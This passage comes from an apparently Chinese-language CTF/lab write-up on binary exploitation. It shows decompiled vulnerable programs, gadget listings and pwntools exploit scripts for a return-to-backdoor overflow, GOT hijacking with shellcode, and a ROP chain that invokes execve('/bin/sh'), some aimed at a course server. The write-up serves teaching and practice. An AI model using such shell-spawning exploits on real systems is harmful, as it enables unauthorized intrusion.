class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This is your second bof challenge ;)&quot;</span>);<br>  fflush(_bss_start);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x30u</span>LL);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(buf) &gt; <span class="hljs-number">0xF</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye bye~~&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">y0u_c4n7_533_m3</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Oh no~~~!&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>但是其实附件给的源码子函数不是这样的，这个应该是IDA自己简化了</strong></p><h5 id="子函数源码："><a href="#子函数源码：" class="headerlink" title="子函数源码："></a>子函数源码：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">y0u_c4n7_533_m3</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> allow = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> (allow) &#123;<br>    execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Oh no~~~!&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">16</span>];<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This is your second bof challenge ;)&quot;</span>);<br>  fflush(<span class="hljs-built_in">stdout</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x30</span>);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strlen</span>(buf) &gt;= <span class="hljs-number">16</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Bye bye~~&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个时候再去看简化后函数的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:0000000000400697 ; void __noreturn y0u_c4n7_533_m3()<br>.text:0000000000400697                 public y0u_c4n7_533_m3<br>.text:0000000000400697 y0u_c4n7_533_m3 proc near<br>.text:0000000000400697<br>.text:0000000000400697 var_4           = dword ptr -4<br>.text:0000000000400697<br>.text:0000000000400697 ; __unwind &#123;<br>.text:0000000000400697                 push    rbp<br>.text:0000000000400698                 mov     rbp, rsp<br>.text:000000000040069B                 sub     rsp, 10h<br>.text:000000000040069F                 mov     [rbp+var_4], 0<br>.text:00000000004006A6                 cmp     [rbp+var_4], 0<br>.text:00000000004006AA                 jz      short loc_4006C4<br>.text:00000000004006AC                 mov     edx, 0          ; envp<br>.text:00000000004006B1                 mov     esi, 0          ; argv<br>.text:00000000004006B6                 lea     rdi, path       ; &quot;/bin/sh&quot;<br>.text:00000000004006BD                 call    _execve<br>.text:00000000004006C2                 jmp     short locret_4006DA<br>.text:00000000004006C4 ; ---------------------------------------------------------------------------<br>.text:00000000004006C4<br>.text:00000000004006C4 loc_4006C4:                             ; CODE XREF: y0u_c4n7_533_m3+13↑j<br>.text:00000000004006C4                 lea     rdi, s          ; &quot;Oh no~~~!&quot;<br>.text:00000000004006CB                 call    _puts<br>.text:00000000004006D0                 mov     edi, 0          ; status<br>.text:00000000004006D5                 call    _exit<br>.text:00000000004006DA ; ---------------------------------------------------------------------------<br>.text:00000000004006DA<br>.text:00000000004006DA locret_4006DA:                          ; CODE XREF: y0u_c4n7_533_m3+2B↑j<br>.text:00000000004006DA                 leave<br>.text:00000000004006DB                 retn<br>.text:00000000004006DB ; &#125; // starts at 400697<br>.text:00000000004006DB y0u_c4n7_533_m3 endp<br>.text:00000000004006DB<br>.text:00000000004006DC<br></code></pre></td></tr></table></figure><p>这个时候我们可以控制返回地址不要直接跳转到后门函数的首地址，而是跳转到这个系统调用的部分，即地址 0x00000000004006AC</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)<br><br>#p = process(&#x27;./bof2&#x27;)<br>p = remote(&#x27;210.30.97.133&#x27;,28085)<br><br>backdoor = 0x04006AC<br>sleep(0.5)<br><br>payload1 = b&#x27;\x00&#x27; + b&#x27;a&#x27;* (15+8) + p64(backdoor)<br><br>p.sendline(payload1)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Lab-4"><a href="#Lab-4" class="headerlink" title="Lab_4:"></a>Lab_4:</h3><h4 id="checksec-3"><a href="#checksec-3" class="headerlink" title="checksec:"></a>checksec:</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/copy/Lab_4/Lab 4$ checksec gothijack<br>[*] &#x27;/mnt/d/copy/Lab_4/Lab 4/gothijack&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX unknown - GNU_STACK missing<br>    PIE:        No PIE (0x400000)<br>    Stack:      Executable<br>    RWX:        Has RWX segments<br>    Stripped:   No<br></code></pre></td></tr></table></figure><h4 id="IDA-Pro-1"><a href="#IDA-Pro-1" class="headerlink" title="IDA_Pro:"></a>IDA_Pro:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">void</span> *buf[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  buf[<span class="hljs-number">1</span>] = (<span class="hljs-type">void</span> *)__readfsqword(<span class="hljs-number">0x28u</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s you name?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, name, <span class="hljs-number">0x40u</span>LL);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Where do you want to write?&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%llu&quot;</span>, buf);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Data: &quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf[<span class="hljs-number">0</span>], <span class="hljs-number">8uLL</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done!&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thank you %s!\n&quot;</span>, name);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python3">from pwn import *<br><br>context(os = &#x27;linux&#x27;,arch = &#x27;amd64&#x27;,log_level = &#x27;debug&#x27; )<br><br>p = process(&#x27;./gothijack&#x27;)<br>#p = remote(&#x27;210.30.97.133&#x27;,28005)<br><br>p.recvuntil(b&#x27;?\n&#x27;)<br><br>sc = asm(shellcraft.sh())<br><br>p.send(sc)<br><br>p.recvuntil(b&#x27;?\n&#x27;)<br><br>puts_got_addr = 0x601018<br>printf_got_addr = 0x601028<br>name_addr = 0x601080<br><br>p.sendline(str(puts_got_addr))<br>#p.sendline(b&#x27;111111&#x27;)<br>pause()<br>p.recvuntil(b&#x27;: &#x27;)<br>p.send(p64(name_addr))<br>pause()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>但是Linux版本更新后，bss段无论开不开NX，它都没有可执行权限，后续打算patch一下改一下权限后重新让组长传上去再写</strong></p><h3 id="Lab-5"><a href="#Lab-5" class="headerlink" title="Lab_5:"></a>Lab_5:</h3><h4 id="checksec-4"><a href="#checksec-4" class="headerlink" title="checksec:"></a>checksec:</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">briteny@localhost:/mnt/d/copy/Lab_5/Lab 5$ checksec rop<br>[*] &#x27;/mnt/d/copy/Lab_5/Lab 5/rop&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Partial RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x400000)<br>    Stripped:   No<br></code></pre></td></tr></table></figure><h4 id="IDA-Pro-2"><a href="#IDA-Pro-2" class="headerlink" title="IDA_Pro:"></a>IDA_Pro:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> v4[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;This is your first rop challenge ;)&quot;</span>, argv, envp);<br>  fflush(<span class="hljs-built_in">stdout</span>);<br>  read(<span class="hljs-number">0</span>, v4, <span class="hljs-number">0x90u</span>LL);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>大致检查过后会发现没有后门函数，也没有可以写shellcode的部分，只能考虑构造rop链</strong></p><h4 id="ROPgadget："><a href="#ROPgadget：" class="headerlink" title="ROPgadget："></a>ROPgadget：</h4><h5 id="pop-rdi-ret-addr"><a href="#pop-rdi-ret-addr" class="headerlink" title="pop_rdi_ret_addr:"></a>pop_rdi_ret_addr:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">briteny@localhost:/mnt/d/copy/Lab_5/Lab 5$ ROPgadget --binary ./rop --only &#x27;pop|ret&#x27;| grep rdi<br>0x0000000000402575 : pop rdi ; pop rbp ; ret<br>0x0000000000400686 : pop rdi ; ret<br></code></pre></td></tr></table></figure><h5 id="pop-rsi-ret-addr"><a href="#pop-rsi-ret-addr" class="headerlink" title="pop_rsi_ret_addr:"></a>pop_rsi_ret_addr:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">briteny@localhost:/mnt/d/copy/Lab_5/Lab 5$ ROPgadget --binary ./rop --only &#x27;pop|ret&#x27;| grep rsi<br>0x000000000044ba39 : pop rdx ; pop rsi ; ret<br>0x0000000000402573 : pop rsi ; pop r15 ; pop rbp ; ret<br>0x0000000000400684 : pop rsi ; pop r15 ; ret<br>0x000000000040f7fe : pop rsi ; pop rbp ; ret<br>0x0000000000410093 : pop rsi ; ret<br>0x0000000000477b73 : pop rsi ; ret 2<br></code></pre></td></tr></table></figure><h5 id="pop-rdx-ret-addr"><a href="#pop-rdx-ret-addr" class="headerlink" title="pop_rdx_ret_addr:"></a>pop_rdx_ret_addr:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">briteny@localhost:/mnt/d/copy/Lab_5/Lab 5$ ROPgadget --binary ./rop --only &#x27;pop|ret&#x27;| grep rdx<br>0x0000000000481876 : pop rax ; pop rdx ; pop rbx ; ret<br>0x000000000044ba14 : pop rdx ; pop r10 ; ret<br>0x0000000000481877 : pop rdx ; pop rbx ; ret<br>0x000000000044ba39 : pop rdx ; pop rsi ; ret<br>0x000000000044ba16 : pop rdx ; ret<br></code></pre></td></tr></table></figure><h5 id="syscall"><a href="#syscall" class="headerlink" title="syscall:"></a>syscall:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">briteny@localhost:/mnt/d/copy/Lab_5/Lab 5$ ROPgadget --binary ./rop --only &#x27;syscall&#x27;<br>Gadgets information<br>============================================================<br>0x00000000004011fc : syscall<br><br>Unique gadgets found: 1<br></code></pre></td></tr></table></figure><h5 id="bin-sh写入"><a href="#bin-sh写入" class="headerlink" title="&#x2F;bin&#x2F;sh写入"></a>&#x2F;bin&#x2F;sh写入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x0000000000446c1b : mov qword ptr [rdi], rsi ; ret<br></code></pre></td></tr></table></figure><p><strong>当然ROPchain往往不止一种，肯定也有别的chain</strong></p><h4 id="readelf："><a href="#readelf：" class="headerlink" title="readelf："></a>readelf：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs assembly">briteny@localhost:/mnt/d/copy/Lab_5/Lab 5$ readelf -S rop<br>There are 33 section headers, starting at offset 0xcdb58:<br><br>Section Headers:<br>  [Nr] Name              Type             Address           Offset<br>       Size              EntSize          Flags  Link  Info  Align<br>  [ 0]                   NULL             0000000000000000  00000000<br>       0000000000000000  0000000000000000           0     0     0<br>  [ 1] .note.ABI-tag     NOTE             0000000000400190  00000190<br>       0000000000000020  0000000000000000   A       0     0     4<br>  [ 2] .note.gnu.bu[...] NOTE             00000000004001b0  000001b0<br>       0000000000000024  0000000000000000   A       0     0     4<br>  [ 3] .rela.plt         RELA             00000000004001d8  000001d8<br>       0000000000000228  0000000000000018  AI       0    20     8<br>  [ 4] .init             PROGBITS         0000000000400400  00000400<br>       0000000000000017  0000000000000000  AX       0     0     4<br>  [ 5] .plt              PROGBITS         0000000000400418  00000418<br>       00000000000000b8  0000000000000000  AX       0     0     8<br>  [ 6] .text             PROGBITS         00000000004004d0  000004d0<br>       000000000008f680  0000000000000000  AX       0     0     16<br>  [ 7] __libc_freeres_fn PROGBITS         000000000048fb50  0008fb50<br>       0000000000001523  0000000000000000  AX       0     0     16<br>  [ 8] __libc_threa[...] PROGBITS         0000000000491080  00091080<br>       000000000000108f  0000000000000000  AX       0     0     16<br>  [ 9] .fini             PROGBITS         0000000000492110  00092110<br>       0000000000000009  0000000000000000  AX       0     0     4<br>  [10] .rodata           PROGBITS         0000000000492120  00092120<br>       000000000001928c  0000000000000000   A       0     0     32<br>  [11] .stapsdt.base     PROGBITS         00000000004ab3ac  000ab3ac<br>       0000000000000001  0000000000000000   A       0     0     1<br>  [12] .eh_frame         PROGBITS         00000000004ab3b0  000ab3b0<br>       000000000000a510  0000000000000000   A       0     0     8<br>  [13] .gcc_except_table PROGBITS         00000000004b58c0  000b58c0<br>       000000000000009e  0000000000000000   A       0     0     1<br>  [14] .tdata            PROGBITS         00000000006b6120  000b6120<br>       0000000000000020  0000000000000000 WAT       0     0     8<br>  [15] .tbss             NOBITS           00000000006b6140  000b6140<br>       0000000000000040  0000000000000000 WAT       0     0     8<br>  [16] .init_array       INIT_ARRAY       00000000006b6140  000b6140<br>       0000000000000010  0000000000000008  WA       0     0     8<br>  [17] .fini_array       FINI_ARRAY       00000000006b6150  000b6150<br>       0000000000000010  0000000000000008  WA       0     0     8<br>  [18] .data.rel.ro      PROGBITS         00000000006b6160  000b6160<br>       0000000000002d94  0000000000000000  WA       0     0     32<br>  [19] .got              PROGBITS         00000000006b8ef8  000b8ef8<br>       00000000000000f8  0000000000000000  WA       0     0     8<br>  [20] .got.plt          PROGBITS         00000000006b9000  000b9000<br>       00000000000000d0  0000000000000008  WA       0     0     8<br>  [21] .data             PROGBITS         00000000006b90e0  000b90e0<br>       0000000000001af0  0000000000000000  WA       0     0     32<br>  [22] __libc_subfreeres PROGBITS         00000000006babd0  000babd0<br>       0000000000000048  0000000000000000  WA       0     0     8<br>  [23] __libc_IO_vtables PROGBITS         00000000006bac20  000bac20<br>       00000000000006a8  0000000000000000  WA       0     0     32<br>  [24] __libc_atexit     PROGBITS         00000000006bb2c8  000bb2c8<br>       0000000000000008  0000000000000000  WA       0     0     8<br>  [25] __libc_threa[...] PROGBITS         00000000006bb2d0  000bb2d0<br>       0000000000000008  0000000000000000  WA       0     0     8<br>  [26] .bss              NOBITS           00000000006bb2e0  000bb2d8<br>       00000000000016f8  0000000000000000  WA       0     0     32<br>  [27] __libc_freer[...] NOBITS           00000000006bc9d8  000bb2d8<br>       0000000000000028  0000000000000000  WA       0     0     8<br>  [28] .comment          PROGBITS         0000000000000000  000bb2d8<br>       000000000000002a  0000000000000001  MS       0     0     1<br>  [29] .note.stapsdt     NOTE             0000000000000000  000bb304<br>       00000000000014cc  0000000000000000           0     0     4<br>  [30] .symtab           SYMTAB           0000000000000000  000bc7d0<br>       000000000000a950  0000000000000018          31   678     8<br>  [31] .strtab           STRTAB           0000000000000000  000c7120<br>       00000000000068c2  0000000000000000           0     0     1<br>  [32] .shstrtab         STRTAB           0000000000000000  000cd9e2<br>       0000000000000176  0000000000000000           0     0     1<br>Key to Flags:<br>  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),<br>  L (link order), O (extra OS processing required), G (group), T (TLS),<br>  C (compressed), x (unknown), o (OS specific), E (exclude),<br>  R (retain), D (mbind), l (large), p (processor specific)<br></code></pre></td></tr></table></figure><p>对应我们要能写入”&#x2F;bin&#x2F;sh”的位置就是 .bss段 </p><p><strong>如果存在一些.bss段上的变量，就最好不要从.bss段的首地址开始写，避免不必要的麻烦</strong></p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp:"></a>exp:</h4><p><strong>由于并没哟‘’&#x2F;bin&#x2F;sh‘’字符，所以还需要添加一个写入‘’&#x2F;bin&#x2F;sh‘’字符的过程</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *<br><br>context(os = &#x27;linux&#x27;,arch = &#x27;amd64&#x27;, log_level = &#x27;debug&#x27;)<br><br>p =remote(&#x27;210.30.97.133&#x27;,28046)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">p = process(<span class="hljs-string">&#x27;./rop&#x27;</span>)</span><br><br>pop_rdi_ret_addr = 0x0000000000400686<br>pop_rsi_ret_addr = 0x0000000000410093<br>pop_rdx_ret_addr = 0x000000000044ba16<br>syscall_addr = 0x00000000004011fc<br>pop_rax_ret_addr = 0x0000000000415294<br>bss_addr = 0x00000000006bb2e0 #写入/bin/sh的地址<br>mov_binsh =  0x0000000000446c1b #写入地址的构造mov qword ptr [rdi], rsi ; ret<br><span class="hljs-meta prompt_">#</span><span class="language-bash">pop_rdx_pop_rsi_ret_addr = 0x000000000044ba39</span><br>offset = 16<br><br>pd1 = b&#x27;a&#x27; * ( offset + 8) + p64( pop_rdi_ret_addr ) + p64( bss_addr ) + p64( pop_rsi_ret_addr ) + b&#x27;/bin/sh\x00&#x27; + p64( mov_binsh ) + p64( pop_rsi_ret_addr ) + p64( 0x0 ) + p64( pop_rdx_ret_addr ) + p64( 0x0 ) + p64( pop_rax_ret_addr ) + p64( 0x3b ) + p64( syscall_addr )<br><br>p.recvuntil(b&#x27;)&#x27;)<br><br>p.send(pd1)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">pause()</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="stack："><a href="#stack：" class="headerlink" title="stack："></a>stack：</h4><table><thead><tr><th align="center">offset * ‘a’</th><th align="center">填充缓冲区</th></tr></thead><tbody><tr><td align="center">8 * ’a‘</td><td align="center">覆盖old_ebp</td></tr><tr><td align="center">0x0000000000400686</td><td align="center">pop rdi ; ret</td></tr><tr><td align="center">0x00000000006bb2e0</td><td align="center">bss段，写入&#x2F;bin&#x2F;sh的位置</td></tr><tr><td align="center">0x0000000000410093</td><td align="center">pop rsi ； ret</td></tr><tr><td align="center">&#x2F;bin&#x2F;sh\x00</td><td align="center">正好八个字节</td></tr><tr><td align="center">0x0000000000446c1b</td><td align="center">mov qword ptr [rdi], rsi ; ret</td></tr><tr><td align="center">0x0000000000410093</td><td align="center">pop rsi ； ret</td></tr><tr><td align="center">0x00</td><td align="center"></td></tr><tr><td align="center">0x000000000044ba16</td><td align="center">pop rdx ; ret</td></tr><tr><td align="center">0x00</td><td align="center"></td></tr><tr><td align="center">0x0000000000415294</td><td align="center">pop rax ; ret</td></tr><tr><td align="center">0x3b</td><td align="center"></td></tr><tr><td align="center">0x00000000004011fc</td><td align="center">syscall系统调用</td></tr></tbody></table><h5 id="assembly"><a href="#assembly" class="headerlink" title="assembly:"></a>assembly:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#从原流程的ret_addr开始<br>pop rdi<br>ret<br>pop rsi<br>ret<br>mov qword ptr [rdi], rsi <br>ret<br>pop rsi<br>ret<br>pop rdx <br>ret<br>pop 